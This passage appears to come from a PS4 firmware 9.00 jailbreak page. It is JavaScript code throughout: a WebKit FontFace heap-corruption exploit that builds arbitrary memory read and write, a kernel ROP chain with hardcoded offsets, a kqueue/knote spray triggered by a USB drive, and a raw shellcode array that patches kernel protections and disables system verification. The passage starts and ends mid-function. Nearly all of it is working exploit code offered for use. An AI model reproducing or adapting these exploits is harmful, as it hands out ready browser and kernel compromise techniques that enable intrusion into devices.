    p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
    p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
    p.write8(fakeVtable_setjmp.add32(0x10), original_context);
    p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
    p.write8(fakeVtable_setjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

    p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
    p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
    p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
    p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
    p.write8(fakeVtable_longjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

    function launch_chain(chain) {
        chain.push(window.gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));

        p.write8(textAreaVtPtr, fakeVtable_setjmp);
        textArea.scrollLeft = 0x0;
        p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
        p.write8(modified_context.add32(0x10), chain.stack);
        p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))

        p.write8(textAreaVtPtr, fakeVtable_longjmp);
        textArea.scrollLeft = 0x0;
        p.write8(textAreaVtPtr, textAreaVtable);
    }

    var kview = new Uint8Array(0x1000);
    var kstr = p.leakval(kview).add32(0x10);
    var orig_kview_buf = p.read8(kstr);

    p.write8(kstr, window.libKernelBase);
    p.write4(kstr.add32(8), 0x40000);
    var countbytes;

    for (var i = 0; i < 0x40000; i++) {
        if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
            countbytes = i;
            break;
        }
    }
    p.write4(kstr.add32(8), countbytes + 32);
    var dview32 = new Uint32Array(1);
    var dview8 = new Uint8Array(dview32.buffer);
    for (var i = 0; i < countbytes; i++) {
        if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
            dview8[0] = kview[i + 3];
            dview8[1] = kview[i + 4];
            dview8[2] = kview[i + 5];
            dview8[3] = kview[i + 6];
            var syscallno = dview32[0];
            window.syscalls[syscallno] = window.libKernelBase.add32(i);
        }
    }
    p.write8(kstr, orig_kview_buf);

    chain = new rop();

    //Sanity check
    if (chain.syscall(20).low == 0) {
        alert("webkit exploit failed. Try again if your ps4 is on fw 9.00.");
        while (1);
    }
}


function run_hax() {
    userland();
    if (chain.syscall(23, 0).low != 0x0) {
       kernel();
       //this wk exploit is pretty stable we can probably afford to kill webkit before payload loader but should we?.
    }
    else
    {
       showMessage("Loading Payload...");
       setTimeout(injectPayload, 3000);
    }
}


function kernel() {
    extra_gadgets();
    kchain_setup();
    object_setup();
    trigger_spray();
}

var handle;
var random_path;
var ex_info;

function load_prx(name) {
    //sys_dynlib_load_prx
    var res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
    if (res.low != 0x0) {
        alert("failed to load prx/get handle " + name);
    }
    //sys_dynlib_get_info_ex
    p.write8(ex_info, 0x1A8);
    res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
    if (res.low != 0x0) {
        alert("failed to get module info from handle");
    }
    var tlsinit = p.read8(ex_info.add32(0x110));
    var tlssize = p.read4(ex_info.add32(0x11C));

    if (tlssize != 0) {
        if (name == "libSceWebKit2.sprx") {
            tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
        } else {
            alert(`${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`);
        }
    }
    return tlsinit;
}

//Obtain extra gadgets through module loading
function extra_gadgets() {
    handle = p.malloc(0x1E8);
    var randomized_path_length_ptr = handle.add32(0x4);
    var randomized_path_ptr = handle.add32(0x14);
    ex_info = randomized_path_ptr.add32(0x40);

    p.write8(randomized_path_length_ptr, 0x2C);
    chain.syscall(602, 0, randomized_path_ptr, randomized_path_length_ptr);
    random_path = p.readstr(randomized_path_ptr);

    var ipmi_addr = load_prx("libSceIpmi.sprx");
    var hmd_addr = load_prx("libSceHmd.sprx");
    var wk2_addr = load_prx("libSceWebKit2.sprx");

    for (var gadget in hmd_gadgetmap) {
        window.gadgets[gadget] = hmd_addr.add32(hmd_gadgetmap[gadget]);
    }
    for (var gadget in wk2_gadgetmap) {
        window.gadgets[gadget] = wk2_addr.add32(wk2_gadgetmap[gadget]);
    }
    for (var gadget in ipmi_gadgetmap) {
        window.gadgets[gadget] = ipmi_addr.add32(ipmi_gadgetmap[gadget]);
    }

    for (var gadget in window.gadgets) {
        p.read8(window.gadgets[gadget]);
        //Ensure all gadgets are available to kernel.
        chain.fcall(window.syscalls[203], window.gadgets[gadget], 0x10);
    }
    chain.run();
}

//Build the kernel rop chain, this is what the kernel will be executing when the fake obj pivots the stack.
function kchain_setup() {
    const KERNEL_busy = 0x1B28DF8;

    const KERNEL_bcopy = 0xACD;
    const KERNEL_bzero = 0x2713FD;
    const KERNEL_pagezero = 0x271441;
    const KERNEL_memcpy = 0x2714BD;
    const KERNEL_pagecopy = 0x271501;
    const KERNEL_copyin = 0x2716AD;
    const KERNEL_copyinstr = 0x271B5D;
    const KERNEL_copystr = 0x271C2D;
    const KERNEL_setidt = 0x312c40;
    const KERNEL_setcr0 = 0x1FB949;
    const KERNEL_Xill = 0x17d500;
    const KERNEL_veriPatch = 0x626874;
    const KERNEL_enable_syscalls_1 = 0x490;
    const KERNEL_enable_syscalls_2 = 0x4B5;
    const KERNEL_enable_syscalls_3 = 0x4B9;
    const KERNEL_enable_syscalls_4 = 0x4C2;
    const KERNEL_mprotect = 0x80B8D;
    const KERNEL_prx = 0x23AEC4;
    const KERNEL_dlsym_1 = 0x23B67F;
    const KERNEL_dlsym_2 = 0x221b40;
    const KERNEL_setuid = 0x1A06;
    const KERNEL_syscall11_1 = 0x1100520;
    const KERNEL_syscall11_2 = 0x1100528;
    const KERNEL_syscall11_3 = 0x110054C;
    const KERNEL_syscall11_gadget = 0x4c7ad;
    const KERNEL_mmap_1 = 0x16632A;
    const KERNEL_mmap_2 = 0x16632D;
    const KERNEL_setcr0_patch = 0x3ade3B;
    const KERNEL_kqueue_close_epi = 0x398991;

    SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
    KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
    //negative offset of kqueue string to kernel base
    //0xFFFFFFFFFF86B593 0x505
    //0xFFFFFFFFFF80E364 0x900
    p.write8(KERNEL_BASE_PTR, new int64(0xFF80E364, 0xFFFFFFFF));

    kchain = new rop();
    kchain2 = new rop();
    //Ensure the krop stack remains available.
    {
        chain.fcall(window.syscalls[203], kchain.stackback, 0x40000);
        chain.fcall(window.syscalls[203], kchain2.stackback, 0x40000);
        chain.fcall(window.syscalls[203], SAVED_KERNEL_STACK_PTR, 0x10);
    }
    chain.run();

    kchain.count = 0;
    kchain2.count = 0;

    kchain.set_kernel_var(KERNEL_BASE_PTR);
    kchain2.set_kernel_var(KERNEL_BASE_PTR);

    kchain.push(gadgets["pop rax"]);
    kchain.push(SAVED_KERNEL_STACK_PTR);
    kchain.push(gadgets["mov [rax], rdi"]);
    kchain.push(gadgets["pop r8"]);
    kchain.push(KERNEL_BASE_PTR);
    kchain.push(gadgets["add [r8], r12"]);

    //Sorry we're closed
    kchain.kwrite1(KERNEL_busy, 0x1);
    kchain.push(gadgets["sti"]); //it should be safe to re-enable interrupts now.


    var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
    var idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
    //Modify UD
    kchain.push(gadgets["pop rdi"]);
    kchain.push(0x6);
    kchain.push(gadgets["pop rsi"]);
    kchain.push(gadgets["mov rsp, rdi"]);
    kchain.push(gadgets["pop rdx"]);
    kchain.push(0xE);
    kchain.push(gadgets["pop rcx"]);
    kchain.push(0x0);
    kchain.push(gadgets["pop r8"]);
    kchain.push(0x0);
    var idx1_dest = kchain.get_rsp();
    kchain.pushSymbolic(); // overwritten with KERNEL_setidt

    kchain.push(gadgets["pop rsi"]);
    kchain.push(0x80040033);
    kchain.push(gadgets["pop rdi"]);
    kchain.push(kchain2.stack);
    var idx2_dest = kchain.get_rsp();
    kchain.pushSymbolic(); // overwritten with KERNEL_setcr0

    kchain.finalizeSymbolic(idx1, idx1_dest);
    kchain.finalizeSymbolic(idx2, idx2_dest);


    //Initial patch(es)
    kchain2.kwrite2(KERNEL_veriPatch, 0x9090);
    kchain2.kwrite1(KERNEL_bcopy, 0xEB);
    //might as well do the others
    kchain2.kwrite1(KERNEL_bzero, 0xEB);
    kchain2.kwrite1(KERNEL_pagezero, 0xEB);
    kchain2.kwrite1(KERNEL_memcpy, 0xEB);
    kchain2.kwrite1(KERNEL_pagecopy, 0xEB);
    kchain2.kwrite1(KERNEL_copyin, 0xEB);
    kchain2.kwrite1(KERNEL_copyinstr, 0xEB);
    kchain2.kwrite1(KERNEL_copystr, 0xEB);

    //I guess you're not all that bad...
    kchain2.kwrite1(KERNEL_busy, 0x0); //it should now be safe to handle timer-y interrupts again

    //Restore original UD
    var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
    var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
    kchain2.push(gadgets["pop rdi"]);
    kchain2.push(0x6);
    kchain2.push(gadgets["pop rsi"]);
    var idx3_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_Xill
    kchain2.push(gadgets["pop rdx"]);
    kchain2.push(0xE);
    kchain2.push(gadgets["pop rcx"]);
    kchain2.push(0x0);
    kchain2.push(gadgets["pop r8"]);
    kchain2.push(0x0);
    var idx4_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_setidt 

    kchain2.finalizeSymbolic(idx3, idx3_dest);
    kchain2.finalizeSymbolic(idx4, idx4_dest);

    //Apply kernel patches    
    kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
    //patch in reverse because /shrug
    kchain2.kwrite1(KERNEL_enable_syscalls_4, 0xEB);
    kchain2.kwrite2(KERNEL_enable_syscalls_3, 0x9090);
    kchain2.kwrite2(KERNEL_enable_syscalls_2, 0x9090);

    kchain2.kwrite1(KERNEL_setuid, 0xEB);
    kchain2.kwrite4(KERNEL_mprotect, 0x00000000);
    kchain2.kwrite2(KERNEL_prx, 0xE990);
    kchain2.kwrite1(KERNEL_dlsym_1, 0xEB);
    kchain2.kwrite4(KERNEL_dlsym_2, 0xC3C03148);

    kchain2.kwrite1(KERNEL_mmap_1, 0x37);
    kchain2.kwrite1(KERNEL_mmap_2, 0x37);

    kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
    kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
    kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);

    //Restore CR0
    kchain2.kwrite4(KERNEL_setcr0_patch, 0xC3C7220F);
    var idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
    kchain2.push(gadgets["pop rdi"]);
    kchain2.push(0x80050033);
    var idx5_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_setcr0_patch
    kchain2.finalizeSymbolic(idx5, idx5_dest);

    //Recover
    kchain2.rax_kernel(KERNEL_kqueue_close_epi);
    kchain2.push(gadgets["mov rdx, rax"]);
    kchain2.push(gadgets["pop rsi"]);
    kchain2.push(SAVED_KERNEL_STACK_PTR);
    kchain2.push(gadgets["mov rax, [rsi]"]);
    kchain2.push(gadgets["pop rcx"]);
    kchain2.push(0x10);
    kchain2.push(gadgets["add rax, rcx"]);
    kchain2.push(gadgets["mov [rax], rdx"]);
    kchain2.push(gadgets["pop rdi"]);
    var idx6 = kchain2.pushSymbolic();
    kchain2.push(gadgets["mov [rdi], rax"]);
    kchain2.push(gadgets["sti"]);
    kchain2.push(gadgets["pop rsp"]);
    var idx6_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with old stack pointer
    kchain2.finalizeSymbolic(idx6, idx6_dest);
}

function object_setup() {
    //Map fake object
    var fake_knote = chain.syscall(477, 0x4000, 0x4000 * 0x3, 0x3, 0x1010, 0xFFFFFFFF, 0x0);
    var fake_filtops = fake_knote.add32(0x4000);
    var fake_obj = fake_knote.add32(0x8000);
    if (fake_knote.low != 0x4000) {
        alert("enomem: " + fake_knote);
        while (1);
    }
    //setup fake object
    //KNOTE
    {
        p.write8(fake_knote, fake_obj);
        p.write8(fake_knote.add32(0x68), fake_filtops)
    }
    //FILTOPS
    {
        p.write8(fake_filtops.sub32(0x79), gadgets["cli ; pop rax"]); //cli ; pop rax ; ret
        p.write8(fake_filtops.add32(0x0), gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]); //xchg rdi, rsp ; call qword ptr [rsi - 0x79]
        p.write8(fake_filtops.add32(0x8), kchain.stack);
        p.write8(fake_filtops.add32(0x10), gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]); //mov rcx, qword ptr [rdi] ; mov rsi, rax ; call qword ptr [rcx + 0x30]
    }
    //OBJ
    {
        p.write8(fake_obj.add32(0x30), gadgets["mov rdi, [rax + 8] ; call [rax]"]); //mov rdi, qword ptr [rax + 8] ; call qword ptr [rax]
    }
    //Ensure the fake knote remains available
    chain.syscall(203, fake_knote, 0xC000);
}

var trigger_spray = function () {

    var NUM_KQUEUES = 0x1B0;
    var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4);
    //Make kqueues
    {
        for (var i = 0; i < NUM_KQUEUES; i++) {
            chain.fcall(window.syscalls[362]);
            chain.write_result4(kqueue_ptr.add32(0x4 * i));
        }
    }
    chain.run();
    var kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);

    var that_one_socket = chain.syscall(97, 2, 1, 0);
    if (that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
        alert("invalid socket");
        while (1);
    }

    //Spray kevents
    var kevent = p.malloc(0x20);
    p.write8(kevent.add32(0x0), that_one_socket);
    p.write4(kevent.add32(0x8), 0xFFFF + 0x010000);
    p.write4(kevent.add32(0xC), 0x0);
    p.write8(kevent.add32(0x10), 0x0);
    p.write8(kevent.add32(0x18), 0x0);
    //
    {
        for (var i = 0; i < NUM_KQUEUES; i++) {
            chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
        }
    }
    chain.run();

    //Fragment memory
    {
        for (var i = 18; i < NUM_KQUEUES; i += 2) {
            chain.fcall(window.syscalls[6], kqueues[i]);
        }
    }
    chain.run();

    //Trigger OOB

    alert("Insert The USB Drive And Click OK When You See The Popup Notification");
    showMessage("Loading ExFatHax...");


    sleep(3000).then(() => {
   
        //Trigger corrupt knote
        {
        for (var i = 1; i < NUM_KQUEUES; i += 2) {
            chain.fcall(window.syscalls[6], kqueues[i]);
        }
        }
        chain.run();

        if (chain.syscall(23, 0).low == 0) {
			
            //cleanup fake knote & release locked gadgets/stack.
            chain.fcall(window.syscalls[73], 0x4000, 0xC000);
            chain.fcall(window.syscalls[325]);
            chain.run();
			
            //This disables sysveri, see https://github.com/ChendoChap/pOOBs4/blob/main/patch.s for more info
            var patch_buffer = chain.syscall(477, 0x0, 0x4000, 0x7, 0x1000, 0xFFFFFFFF, 0);
            var patch_buffer_view = p.array_from_address(patch_buffer, 0x1000);
            var PatchPl = [0x00000BB8,0xFE894800,0x033D8D48,0x0F000000,0x4855C305,0x8B48E589,0x95E8087E,0xE8000000,0x00000175,0x033615FF,0x8B480000,0x0003373D,0x3F8B4800,0x74FF8548,0x3D8D48EB,0x0000029D,0xF9358B48,0x48000002,0x0322158B,0x8B480000,0x00D6E812,0x8D480000,0x00029F3D,0x358B4800,0x000002E4,0x05158B48,0x48000003,0xB9E8128B,0x48000000,0x02633D8D,0x8B480000,0x0002BF35,0x158B4800,0x000002C8,0xE8128B48,0x0000009C,0x7A3D8D48,0x48000002,0x02AA358B,0x8B480000,0x0002AB15,0x128B4800,0x00007FE8,0x0185E800,0xC35D0000,0x6D3D8948,0x48000002,0x026E3D01,0x01480000,0x00026F3D,0x3D014800,0x00000270,0x713D0148,0x48000002,0x02723D01,0x01480000,0x0002933D,0x3D014800,0x00000294,0x653D0148,0x48000002,0x02663D01,0x01480000,0x0002873D,0x3D014800,0x00000288,0x893D0148,0x48000002,0x028A3D01,0x01480000,0x00028B3D,0x3D014800,0x0000024C,0x3D3D0148,0xC3000002,0xE5894855,0x10EC8348,0x24348948,0x24548948,0xED15FF08,0x48000001,0x4B74C085,0x48C28948,0x4840408B,0x2F74C085,0x28788B48,0x243C3B48,0x8B480A74,0xC0854800,0xECEB1D74,0x18788B48,0x74FF8548,0x7F8B48ED,0x7C3B4810,0xE2750824,0xFF1040C7,0x48FFFFFF,0x31107A8D,0x31D231F6,0xA515FFC9,0x48000001,0x5D10C483,0x894855C3,0xC0200FE5,0xFFFF2548,0x220FFFFE,0x3D8B48C0,0x000001C8,0x909007C7,0x47C79090,0x48909004,0x358B48B8,0x000001AC,0x08778948,0x651047C7,0xC73C8B48,0x00251447,0x47C70000,0x89480018,0x1C47C738,0xB8489090,0x7D358B48,0x48000001,0xC7207789,0xC7482847,0x47C70100,0x0000002C,0x778D48E9,0x158B4834,0x00000150,0x89F22948,0x8B483057,0x00016B35,0x568D4800,0xD7294805,0xC148FF89,0x814808E7,0x0000E9CF,0x3E894800,0x00000D48,0x220F0001,0x55C35DC0,0x0FE58948,0x2548C020,0xFFFEFFFF,0x48C0220F,0x013A3D8B,0x07C70000,0x00C3C031,0x353D8B48,0xC7000001,0xC3C03107,0x3D8B4800,0x00000130,0xC03107C7,0x8B4800C3,0x00012B3D,0x3107C700,0x4800C3C0,0x00A63D8B,0x87C70000,0x001F1E01,0x9090F631,0x1E0587C7,0xC931001F,0x87C79090,0x001F1E09,0x9090D231,0x1E3E87C7,0xC931001F,0x0D489090,0x00010000,0xFFC0220F,0x0000EF15,0xC0200F00,0xFFFF2548,0x220FFFFE,0x3D8B48C0,0x000000DC,0xC03107C7,0x0D4800C3,0x00010000,0x5DC0220F,0x737973C3,0x5F6D6574,0x70737573,0x5F646E65,0x73616870,0x705F3265,0x735F6572,0x00636E79,0x74737973,0x725F6D65,0x6D757365,0x68705F65,0x32657361,0x73797300,0x5F6D6574,0x75736572,0x705F656D,0x65736168,0x90900033,0x00000000,0x00000000,0x000F88F0,0x00000000,0x002EF170,0x00000000,0x00018DF0,0x00000000,0x00018EF0,0x00000000,0x02654110,0x00000000,0x00097230,0x00000000,0x00402E60,0x00000000,0x01520108,0x00000000,0x01520100,0x00000000,0x00462D20,0x00000000,0x00462DFC,0x00000000,0x006259A0,0x00000000,0x006268D0,0x00000000,0x00625DC0,0x00000000,0x00626290,0x00000000,0x00626720,0x00000000];
            for(var i=0; i < PatchPl.length; i++)
            {
              patch_buffer_view[i] = PatchPl[i];
            }
            chain.fcall(window.syscalls[203], patch_buffer, 0x4000);
            chain.fcall(patch_buffer, p.read8(KERNEL_BASE_PTR));
            chain.fcall(window.syscalls[73], patch_buffer, 0x4000);
            chain.run();

            showMessage("Loading Payload...<br>Remove the USB Drive.");
            setTimeout(injectPayload, 3000);
        }
        else
        {
            alert("failed to trigger exploit kernel heap might be corrupted, try again or reboot the console");
            p.write8(0, 0);
        }
    });
}
</script>
<script>
var PAGE_SIZE = 16384;
var SIZEOF_CSS_FONT_FACE = 0xb8;
var HASHMAP_BUCKET = 208;
var STRING_OFFSET = 20;
var SPRAY_FONTS = 0x100a;
var GUESS_FONT = 0x200430000;
var NPAGES = 20;
var INVALID_POINTER = 0;
var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
var HAMMER_NSTRINGS = 700; //tweak this if crashing during hammer time

function poc() {

    var union = new ArrayBuffer(8);
    var union_b = new Uint8Array(union);
    var union_i = new Uint32Array(union);
    var union_f = new Float64Array(union);

    var bad_fonts = [];

    for (var i = 0; i < SPRAY_FONTS; i++)
        bad_fonts.push(new FontFace("font1", "", {}));

    var good_font = new FontFace("font2", "url(data:text/html,)", {});
    bad_fonts.push(good_font);

    var arrays = [];
    for (var i = 0; i < 512; i++)
        arrays.push(new Array(31));

    arrays[256][0] = 1.5;
    arrays[257][0] = {};
    arrays[258][0] = 1.5;

    var jsvalue = {
        a: arrays[256],
        b: new Uint32Array(1),
        c: true
    };

    var string_atomifier = {};
    var string_id = 10000000;

    function ptrToString(p) {
        var s = '';
        for (var i = 0; i < 8; i++) {
            s += String.fromCharCode(p % 256);
            p = (p - p % 256) / 256;
        }
        return s;
    }

    function stringToPtr(p, o) {
        if (o === undefined)
            o = 0;
        var ans = 0;
        for (var i = 7; i >= 0; i--)
            ans = 256 * ans + p.charCodeAt(o + i);
        return ans;
    }

    var strings = [];

    function mkString(l, head) {
        var s = head + '\u0000'.repeat(l - STRING_OFFSET - 8 - head.length) + (string_id++);
        string_atomifier[s] = 1;
        strings.push(s);
        return s;
    }

    var guf = GUESS_FONT;
    var ite = true;
    var matches = 0;

    var round = 0;

    window.ffses = {};

    do {

        var p_s = ptrToString(NPAGES + 2); // vector.size()
        for (var i = 0; i < NPAGES; i++)
            p_s += ptrToString(guf + i * PAGE_SIZE);
        p_s += ptrToString(INVALID_POINTER);

        for (var i = 0; i < 256; i++)
            mkString(HASHMAP_BUCKET, p_s);

        var ffs = ffses["search_" + (++round)] = new FontFaceSet(bad_fonts);

        var badstr1 = mkString(HASHMAP_BUCKET, p_s);

        var guessed_font = null;
        var guessed_addr = null;

        for (var i = 0; i < SPRAY_FONTS; i++) {
            bad_fonts[i].family = "search" + round;
            if (badstr1.substr(0, p_s.length) != p_s) {
                guessed_font = i;
                var p_s1 = badstr1.substr(0, p_s.length);
                for (var i = 1; i <= NPAGES; i++) {
                    if (p_s1.substr(i * 8, 8) != p_s.substr(i * 8, 8)) {
                        guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
                        break;
                    }
                }
                if (matches++ == 0) {
                    guf = guessed_addr + 2 * PAGE_SIZE;
                    guessed_addr = null;
                }
                break;
            }
        }

        if ((ite = !ite))
            guf += NPAGES * PAGE_SIZE;

    }
    while (guessed_addr === null);

    var p_s = '';
    p_s += ptrToString(26);
    p_s += ptrToString(guessed_addr);
    p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
    for (var i = 0; i < 19; i++)
        p_s += ptrToString(INVALID_POINTER);

    for (var i = 0; i < 256; i++)
        mkString(HASHMAP_BUCKET, p_s);

    var needfix = [];
    for (var i = 0;; i++) {
        ffses["ffs_leak_" + i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
        var badstr2 = mkString(HASHMAP_BUCKET, p_s);
        needfix.push(mkString(HASHMAP_BUCKET, p_s));
        bad_fonts[guessed_font].family = "evil2";
        bad_fonts[guessed_font + 1].family = "evil3";
        var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
        if (leak < 0x1000000000000)
            break;
    }

    function makeReader(read_addr, ffs_name) {
        var fake_s = '';
        fake_s += '0000'; //padding for 8-byte alignment
        fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff'; //refcount=255, length=0xffffffff
        fake_s += ptrToString(read_addr); //where to read from
        fake_s += ptrToString(0x80000014); //some fake non-zero hash, atom, 8-bit
        p_s = '';
        p_s += ptrToString(29);
        p_s += ptrToString(guessed_addr);
        p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
        p_s += ptrToString(guessed_addr + 2 * SIZEOF_CSS_FONT_FACE);
        for (var i = 0; i < 18; i++)
            p_s += ptrToString(INVALID_POINTER);
        for (var i = 0; i < 256; i++)
            mkString(HASHMAP_BUCKET, p_s);
        var the_ffs = ffses[ffs_name] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], bad_fonts[guessed_font + 2], good_font]);
        mkString(HASHMAP_BUCKET, p_s);
        var relative_read = mkString(HASHMAP_BUCKET, fake_s);
        bad_fonts[guessed_font].family = ffs_name + "_evil1";
        bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
        bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
        needfix.push(relative_read);
        if (relative_read.length < 1000) //failed
            return makeReader(read_addr, ffs_name + '_');
        return relative_read;
    }

    var fastmalloc = makeReader(leak, 'ffs3'); //read from leaked string ptr

    for (var i = 0; i < 100000; i++)
        mkString(128, '');

    var props = [];
    for (var i = 0; i < 0x10000; i++) {
        props.push({
            value: 0x41434442
        });
        props.push({
            value: jsvalue
        });
    }

    var jsvalue_leak = null;

    while (jsvalue_leak === null) {
        Object.defineProperties({}, props);
        for (var i = 0;; i++) {
            if (fastmalloc.charCodeAt(i) == 0x42 &&
                fastmalloc.charCodeAt(i + 1) == 0x44 &&
                fastmalloc.charCodeAt(i + 2) == 0x43 &&
                fastmalloc.charCodeAt(i + 3) == 0x41 &&
                fastmalloc.charCodeAt(i + 4) == 0 &&
                fastmalloc.charCodeAt(i + 5) == 0 &&
                fastmalloc.charCodeAt(i + 6) == 254 &&
                fastmalloc.charCodeAt(i + 7) == 255 &&
                fastmalloc.charCodeAt(i + 24) == 14
            ) {
                jsvalue_leak = stringToPtr(fastmalloc, i + 32);
                break;
            }
        }
    }

    var rd_leak = makeReader(jsvalue_leak, 'ffs4');
    var array256 = stringToPtr(rd_leak, 16); //arrays[256]
    var ui32a = stringToPtr(rd_leak, 24); //Uint32Array

    var rd_arr = makeReader(array256, 'ffs5');
    var butterfly = stringToPtr(rd_arr, 8);

    var rd_ui32 = makeReader(ui32a, 'ffs6');
    for (var i = 0; i < 8; i++)
        union_b[i] = rd_ui32.charCodeAt(i);

    var structureid_low = union_i[0];
    var structureid_high = union_i[1];

    //setup for addrof/fakeobj
    //in array[256] butterfly: 0 = &bad_fonts[guessed_font+12] as double
    //in array[257] butterfly: 0 = {0x10000, 0x10000} as jsvalue
    union_i[0] = 0x10000;
    union_i[1] = 0; //account for nan-boxing
    arrays[257][1] = {}; //force it to still be jsvalue-array not double-array
    arrays[257][0] = union_f[0];
    union_i[0] = (guessed_addr + 12 * SIZEOF_CSS_FONT_FACE) | 0;
    union_i[1] = (guessed_addr - guessed_addr % 0x100000000) / 0x100000000;
    arrays[256][i] = union_f[0];

    //hammer time!

    pp_s = '';
    pp_s += ptrToString(56);
    for (var i = 0; i < 12; i++)
        pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);

    var fake_s = '';
    fake_s += '0000'; //padding for 8-byte alignment
    fake_s += ptrToString(INVALID_POINTER); //never dereferenced
    fake_s += ptrToString(butterfly); //hammer target
    fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000'; //length=34

    var ffs7_args = [];
    for (var i = 0; i < 12; i++)
        ffs7_args.push(bad_fonts[guessed_font + i]);
    ffs7_args.push(good_font);

    var ffs8_args = [bad_fonts[guessed_font + 12]];
    for (var i = 0; i < 5; i++)
        ffs8_args.push(new FontFace(HAMMER_FONT_NAME, "url(data:text/html,)", {}));

    for (var i = 0; i < HAMMER_NSTRINGS; i++)
        mkString(HASHMAP_BUCKET, pp_s);

    ffses.ffs7 = new FontFaceSet(ffs7_args);
    mkString(HASHMAP_BUCKET, pp_s);
    ffses.ffs8 = new FontFaceSet(ffs8_args);
    var post_ffs = mkString(HASHMAP_BUCKET, fake_s);
    needfix.push(post_ffs);

    for (var i = 0; i < 13; i++)
        bad_fonts[guessed_font + i].family = "hammer" + i;

    function boot_addrof(obj) {
        arrays[257][32] = obj;
        union_f[0] = arrays[258][0];
        return union_i[1] * 0x100000000 + union_i[0];
    }

    function boot_fakeobj(addr) {
        union_i[0] = addr;
        union_i[1] = (addr - addr % 0x100000000) / 0x100000000;
        arrays[258][0] = union_f[0];
        return arrays[257][32];
    }

    //craft misaligned typedarray

    var arw_master = new Uint32Array(8);
    var arw_slave = new Uint8Array(1);
    var obj_master = new Uint32Array(8);
    var obj_slave = {
        obj: null
    };

    var addrof_slave = boot_addrof(arw_slave);
    var addrof_obj_slave = boot_addrof(obj_slave);
    union_i[0] = structureid_low;
    union_i[1] = structureid_high;
    union_b[6] = 7;
    var obj = {
        jscell: union_f[0],
        butterfly: true,
        buffer: arw_master,
        size: 0x5678
    };

    function i48_put(x, a) {
        a[4] = x | 0;
        a[5] = (x / 4294967296) | 0;
    }

    function i48_get(a) {
        return a[4] + a[5] * 4294967296;
    }

    window.addrof = function (x) {
        obj_slave.obj = x;
        return i48_get(obj_master);
    }

    window.fakeobj = function (x) {
        i48_put(x, obj_master);
        return obj_slave.obj;
    }

    function read_mem_setup(p, sz) {
        i48_put(p, arw_master);
        arw_master[6] = sz;
    }

    window.read_mem = function (p, sz) {
        read_mem_setup(p, sz);
        var arr = [];
        for (var i = 0; i < sz; i++)
            arr.push(arw_slave[i]);
        return arr;
    };

    window.write_mem = function (p, data) {
